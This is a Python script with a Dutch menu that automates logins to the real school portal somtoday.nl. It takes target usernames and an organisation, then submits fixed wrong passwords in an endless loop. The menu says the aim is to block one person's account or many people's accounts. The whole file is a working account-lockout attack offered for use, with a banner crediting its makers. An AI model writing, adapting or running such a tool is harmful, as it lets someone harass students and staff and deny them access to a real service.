import shutil
import random
import string
import os
from playwright.sync_api import sync_playwright
os.system("clear")

def run():
    # Read usernames
    with open(xyz, "r", encoding="utf-8") as f:
        usernames = [line.strip() for line in f if line.strip()]

    passwords = [
        "827391729",
        "827391722",
        "827391724",
        "827391720",
        "827391726",
    ]

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()

        for username in usernames:
            # Reload login page fresh for each username
            page.goto("https://somtoday.nl/", wait_until="domcontentloaded")

            org = page.locator("#organisatieSearchField")
            user = page.locator("#usernameField")
            pwd = page.locator("#password-field")

            # Organization
            org.fill(orgchose)
            org.press("Enter")

            # Username
            user.fill(username)
            user.press("Enter")

            # Password attempts
            for pw in passwords:
                pwd.fill(pw)
                pwd.press("Enter")

        browser.close()


print(r"""
  _________             __________.__                 __   __________
 /   _____/ ____   _____\______   \  |   ____   ____ |  | _\______   \
 \_____  \ /  _ \ /     \|    |  _/  |  /  _ \_/ ___\|  |/ /|       _/
 /        (  <_> )  Y Y  \    |   \  |_(  <_> )  \___|    < |    |   \
/_______  /\____/|__|_|  /______  /____/\____/ \___  >__|_ \|____|_  /
        \/             \/       \/                 \/     \/       \/
              ,        ,
             /(        )`
             \ \___   / |
             /- _  `-/  '
            (/\/ \ \   /\
            / /   | `    \
            O O   ) /    |
            `-^--'`<     '
           (_.)  _  )   /
            `.___/`    /
              `-----' /
 <----.     __ / __   \
 <----|====O)))==) \) /====
 <----'    `--' `.__,' \
              |        |
               \       /
          ______( (_  / \______
        ,'  ,-----'   |        \
        `--{__________)        \/

Gemaakt door sterrenkunde, koolstof en spekkie bahez
""")
print("-----" * 20)

choice = int(input("1. Blokkeer een persoon's account\n2. Blokkeer meerdere mensen hun accounts\nmenu> "))
orgchose = input("Welke organisatie wil je aanvallen?\norganisatie> ")
if choice == 1:
	wie = input("Wiens account wil je blokkeren?\nTarget> ")
	print("Tijdelijk folder maken...")
	rand_str = ''.join(random.choices(string.ascii_letters + string.digits, k=7))
	os.system("mkdir "+rand_str)
	print(rand_str + " folder gemaakt")
	#user_input = input("Enter something: ")
	xyz = "./"+rand_str+"/output1.txt"
	with open(xyz, "a") as f:
    		f.write(wie + "\n")
	print("Aanval beginnen...")
	while True:
		run()
	shutil.rmtree(xyz)
elif choice == 2:
	xyz = input("In welk bestand staan de gebruikers voor de aanval?(.txt)\nBestand> ")
	while True:
		run()
